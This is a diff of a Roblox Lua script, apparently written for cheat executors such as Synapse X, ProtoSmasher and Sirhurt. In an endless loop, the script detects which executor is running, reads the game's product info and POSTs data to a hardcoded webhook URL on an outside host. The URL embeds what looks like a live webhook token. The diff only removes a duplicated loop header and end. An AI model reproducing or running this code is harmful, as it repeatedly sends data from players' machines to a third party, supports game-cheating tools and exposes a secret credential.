@@ -1,8 +1,6 @@
 while true do 
 local WebHook = "https://webhook.newstargeted.com/api/webhooks/1188856272116777041/tHf8kiKVSaBZDw7fJMVrbQ8eHuE3BgfrXAR97DrVwmyxf-JLFhDzbtgbt_S150KvDNh2" -- enter your webhook here
- 
- 
-while true do
+
     local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
     local webhookcheck =
        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -34,5 +32,4 @@ while true do
     request = http_request or request or HttpPost or syn.request
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
-end
 end
